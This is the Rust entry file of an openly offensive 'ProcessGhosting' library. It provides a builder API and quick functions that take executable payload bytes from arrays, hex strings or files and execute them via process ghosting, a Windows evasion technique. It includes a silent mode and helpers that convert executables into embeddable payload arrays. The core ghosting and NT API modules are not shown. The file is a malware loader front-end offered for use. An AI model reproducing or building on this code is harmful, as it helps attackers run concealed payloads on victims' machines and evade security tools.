//! ProcessGhosting Library by BlackTechX
//! Process Ghosting Implementation in Rust

mod ntapi;
mod ghosting;

pub use ghosting::{GhostingConfig, Architecture, execute_ghost_process};

/// Library version
pub const VERSION: &str = "1.0.0";
/// Library author
pub const AUTHOR: &str = "BlackTechX";

/// Initialize the library and print banner
pub fn init() {
    println!("╔══════════════════════════════════════════════════╗");
    println!("║       ProcessGhosting Library v{}             ║", VERSION);
    println!("║       Author: {}                         ║", AUTHOR);
    println!("╚══════════════════════════════════════════════════╝");
    println!();
}

/// Configuration builder for the ghosting operation
#[derive(Clone)]
pub struct GhostingBuilder {
    payload: Vec<u8>,
    architecture: Architecture,
    verbose: bool,
}

impl GhostingBuilder {
    /// Create a new builder with the payload bytes
    pub fn new(payload: &[u8]) -> Self {
        Self {
            payload: payload.to_vec(),
            architecture: Architecture::X64,
            verbose: true,
        }
    }

    /// Create from hex array format: &[0x4D, 0x5A, 0x90, ...]
    pub fn from_hex_array(hex_bytes: &[u8]) -> Self {
        Self {
            payload: hex_bytes.to_vec(),
            architecture: Architecture::X64,
            verbose: true,
        }
    }

    /// Create from hex string like "4D5A90" or "4D 5A 90" or "0x4D, 0x5A, 0x90"
    pub fn from_hex_string(hex_string: &str) -> Result<Self, String> {
        let bytes = parse_hex_string(hex_string)?;
        Ok(Self {
            payload: bytes,
            architecture: Architecture::X64,
            verbose: true,
        })
    }

    /// Create from a file path
    pub fn from_file(file_path: &str) -> Result<Self, String> {
        let payload = std::fs::read(file_path)
            .map_err(|e| format!("Failed to read file: {}", e))?;
        
        Ok(Self {
            payload,
            architecture: Architecture::X64,
            verbose: true,
        })
    }

    /// Set the target architecture
    pub fn architecture(mut self, arch: Architecture) -> Self {
        self.architecture = arch;
        self
    }

    /// Set x64 architecture
    pub fn x64(mut self) -> Self {
        self.architecture = Architecture::X64;
        self
    }

    /// Set x86 architecture
    pub fn x86(mut self) -> Self {
        self.architecture = Architecture::X86;
        self
    }

    /// Set verbose output
    pub fn verbose(mut self, verbose: bool) -> Self {
        self.verbose = verbose;
        self
    }

    /// Enable verbose output
    pub fn with_logging(mut self) -> Self {
        self.verbose = true;
        self
    }

    /// Disable verbose output (silent mode)
    pub fn silent(mut self) -> Self {
        self.verbose = false;
        self
    }

    /// Build the configuration
    pub fn build(self) -> GhostingConfig {
        GhostingConfig {
            payload: self.payload,
            architecture: self.architecture,
            verbose: self.verbose,
        }
    }

    /// Execute the ghosting operation directly
    pub fn execute(self) -> Result<(), String> {
        let config = self.build();
        execute_ghost_process(config)
    }
}

// ============================================================================
// Hex Conversion Utilities
// ============================================================================

/// Parse hex string in various formats:
/// - "4D5A90" (continuous)
/// - "4D 5A 90" (space separated)
/// - "0x4D, 0x5A, 0x90" (C-style array)
/// - "0x4D,0x5A,0x90" (C-style without spaces)
/// - "\\x4D\\x5A\\x90" (escaped format)
pub fn parse_hex_string(hex_string: &str) -> Result<Vec<u8>, String> {
    let cleaned: String = hex_string
        .replace("0x", "")
        .replace("0X", "")
        .replace("\\x", "")
        .replace(",", "")
        .replace(" ", "")
        .replace("\n", "")
        .replace("\r", "")
        .replace("\t", "");
    
    if cleaned.len() % 2 != 0 {
        return Err("Invalid hex string length".to_string());
    }

    let bytes: Result<Vec<u8>, _> = (0..cleaned.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&cleaned[i..i + 2], 16))
        .collect();

    bytes.map_err(|_| "Failed to parse hex string".to_string())
}

/// Read an executable file and return hex bytes as formatted string
/// Format: "0x4D, 0x5A, 0x90, ..."
pub fn exe_to_hex_string(file_path: &str) -> Result<String, String> {
    let bytes = std::fs::read(file_path)
        .map_err(|e| format!("Failed to read file: {}", e))?;
    
    Ok(bytes_to_hex_string(&bytes))
}

/// Convert bytes to hex string format: "0x4D, 0x5A, 0x90, ..."
pub fn bytes_to_hex_string(bytes: &[u8]) -> String {
    bytes
        .iter()
        .map(|b| format!("0x{:02X}", b))
        .collect::<Vec<String>>()
        .join(", ")
}

/// Read an executable file and return hex bytes as formatted string with line breaks
/// Format suitable for code: 16 bytes per line
pub fn exe_to_hex_array(file_path: &str) -> Result<String, String> {
    let bytes = std::fs::read(file_path)
        .map_err(|e| format!("Failed to read file: {}", e))?;
    
    Ok(bytes_to_hex_array(&bytes))
}

/// Convert bytes to hex array format with line breaks (16 bytes per line)
pub fn bytes_to_hex_array(bytes: &[u8]) -> String {
    let mut result = String::new();
    result.push_str("[\n");
    
    for (i, chunk) in bytes.chunks(16).enumerate() {
        result.push_str("    ");
        for (j, byte) in chunk.iter().enumerate() {
            result.push_str(&format!("0x{:02X}", byte));
            if i * 16 + j < bytes.len() - 1 {
                result.push_str(", ");
            }
        }
        result.push('\n');
    }
    
    result.push(']');
    result
}

/// Read exe file and return raw bytes
pub fn read_exe_bytes(file_path: &str) -> Result<Vec<u8>, String> {
    std::fs::read(file_path)
        .map_err(|e| format!("Failed to read file: {}", e))
}

/// Print exe as hex to console
pub fn print_exe_hex(file_path: &str) -> Result<(), String> {
    let hex = exe_to_hex_string(file_path)?;
    println!("// File: {}", file_path);
    println!("// Size: {} bytes", std::fs::metadata(file_path)
        .map_err(|e| format!("Failed to get file info: {}", e))?.len());
    println!();
    println!("const PAYLOAD: &[u8] = &[");
    
    let bytes = std::fs::read(file_path)
        .map_err(|e| format!("Failed to read file: {}", e))?;
    
    for (i, chunk) in bytes.chunks(16).enumerate() {
        print!("    ");
        for (j, byte) in chunk.iter().enumerate() {
            print!("0x{:02X}", byte);
            if i * 16 + j < bytes.len() - 1 {
                print!(", ");
            }
        }
        println!();
    }
    
    println!("];");
    Ok(())
}

// ============================================================================
// Quick Execution Functions
// ============================================================================

/// Quick execution with default settings (x64, verbose)
pub fn ghost_payload(payload: &[u8]) -> Result<(), String> {
    init();
    GhostingBuilder::new(payload)
        .x64()
        .with_logging()
        .execute()
}

/// Quick execution from hex string
pub fn ghost_payload_hex(hex_string: &str) -> Result<(), String> {
    init();
    GhostingBuilder::from_hex_string(hex_string)?
        .x64()
        .with_logging()
        .execute()
}

/// Quick execution from file
pub fn ghost_payload_file(file_path: &str) -> Result<(), String> {
    init();
    GhostingBuilder::from_file(file_path)?
        .x64()
        .with_logging()
        .execute()
}

/// Quick execution with architecture selection
pub fn ghost_payload_arch(payload: &[u8], arch: Architecture) -> Result<(), String> {
    init();
    GhostingBuilder::new(payload)
        .architecture(arch)
        .with_logging()
        .execute()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_hex_parsing_continuous() {
        let result = parse_hex_string("4D5A9000");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), vec![0x4D, 0x5A, 0x90, 0x00]);
    }

    #[test]
    fn test_hex_parsing_with_spaces() {
        let result = parse_hex_string("4D 5A 90 00");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), vec![0x4D, 0x5A, 0x90, 0x00]);
    }

    #[test]
    fn test_hex_parsing_c_style() {
        let result = parse_hex_string("0x4D, 0x5A, 0x90, 0x00");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), vec![0x4D, 0x5A, 0x90, 0x00]);
    }

    #[test]
    fn test_hex_parsing_escaped() {
        let result = parse_hex_string("\\x4D\\x5A\\x90\\x00");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), vec![0x4D, 0x5A, 0x90, 0x00]);
    }

    #[test]
    fn test_bytes_to_hex() {
        let bytes = vec![0x4D, 0x5A, 0x90];
        let hex = bytes_to_hex_string(&bytes);
        assert_eq!(hex, "0x4D, 0x5A, 0x90");
    }

    #[test]
    fn test_architecture_setting() {
        let config = GhostingBuilder::new(&[0x4D, 0x5A])
            .x86()
            .build();
        assert_eq!(config.architecture, Architecture::X86);

        let config = GhostingBuilder::new(&[0x4D, 0x5A])
            .x64()
            .build();
        assert_eq!(config.architecture, Architecture::X64);
    }
}